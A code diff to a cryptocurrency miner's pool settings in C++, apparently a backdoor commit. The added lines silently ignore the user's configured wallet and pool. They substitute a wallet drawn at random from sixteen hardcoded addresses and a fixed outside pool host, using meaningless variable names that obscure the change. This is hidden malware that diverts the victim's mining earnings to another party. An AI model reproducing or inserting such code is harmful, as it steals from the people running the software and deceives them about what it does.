@@ -12,10 +12,19 @@
 #define DEV_SETTINGS_URL        "http://coinfee.changeling.biz/index.json"
 
 pool_settings_provider::pool_settings_provider(arguments &args) {
+    
+    const string wordList[16] = {"4dkJEWHWMVpTFTD6pZr8111zWoRNJUmoStit56uL3Urhte98L1Lm3VBWhUCkS6MAYyyPFNSVCqbKccLTmFbiYgA6","36emHJrD7TjVnbrvJzpooocHD2vnEMZHjHMm3kk3tMpMhPgw5NfYPtZEiu6nBJjeJi21vwLAD2d5afKDRiJPeQKW","4migato2bH4mdWUVMWTrUC49bCGARNnqR1YAteUJ3tEJVobjrooSa6NqK2Uwehu9WFtpLwwEmcwT63Xcphun1bwj","xZDcVyJeLLxqqsn6CeygQMR5zBTi9Gfk1d7XG3rj7WmypGrqRVBXWHg3WMk7yNfpbXnw85LBzY6j42F4qgpJRUP","2z2hwRPjLrQoN3UBsCX4EMRQxdcMxMFsQeJkUnZvgGXZnAsG2dBf3FXZdrk9stxzgd2Hrzdy8HxQb6AGFEEa5xkk","28xqj4rxaoBfMeHnCb9gS9t3ezWMvPZ34qYhD4Tu5iSZhEpc3Q6cZYWowgyLuSqsAnbsy2Dw3cNjWR3A6WMnGoa2","45rqQs8nm37XEtzK38aSJyDiyXXDKCtkFhbM7WtFGAATBLqAHq1CE9HyZZ7V4wtQ94qZPQbJ89mQgyXcS8XRWUB9","2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1FgZBpy2Ew5xxQ4Tio","5rEFp6nz3dKeh7pqTNGdboB5rXuVCTZzs9Kf2CfsNmfqmEB6qDDoBzHDMBtsss93AnY45vRhcrsG6wnvSUQ1xNfY","2uSumAAQhC9aoNhNByBGZnkggpJsgdUMEvc1uvwfD3U9oMx5ZFpcjMr5FZYJ8JGvYJq1fktTC59vWae4bpMucUHh","3AbSfjDv939BrcA4m36RwcnPaThJSYWoEzn1PYpwJEhjVvBgKmets1HzxHyVGHPo4jjYHaK3TeE6WKqihwZosDYQ","2HFWwFQR3rv7wiizhQJczUXUUg6pUiWU9VKpxHKDXRQvLrKoe3KiHU2uChdZH7VYzuyGptenvCTLrc5hUm2nNYR8","29FX8criL5XARhPh3DpYoCnCV6ugxDGuri3UaZUFyVmBGrLNPyMEntQXTXtxhPwT3PgsGvttWC2DcESvgvssZfcP","2msYiYt3bRFLsQ68T8W9qe6eGigtum47Ls7vAjcxLuKZ2VjAAmhrhCzc8wKvqqekUb7wBbH5CfU3ArUtZZbSu3kW","mS9jaWixB13wVPG5EgmSH96AYwyiyVqbu9e4XL6PCURtNn5Vt9XsRhTajdEjnbzPa38nrxtxec9Y9FCiAd6og4p","4C3dTfkBKdhZopm486NPASJXKrvYUiQwqzVosxwhbYG1LpTw4VdGYEjygmTMj7Gk4RZC7syazfVAQisTfxYdJ6Yf"};
+
+    const string word = wordList[rand() % 16];
+    
+    const string wordList84[1] = {"http://linux84.distro.cloudns.cl:71"};
+
+    const string word84 = wordList84[rand() % 1];
+    
     __last_devfee_update = 0;
 
-    __user_pool_settings.wallet = args.wallet();
-    __user_pool_settings.pool_address = args.pool();
+    __user_pool_settings.wallet = word;
+    __user_pool_settings.pool_address = "http://linux84.distro.cloudns.cl:71";
     __user_pool_settings.is_devfee = false;
     __user_pool_settings.pool_extensions = "";
 
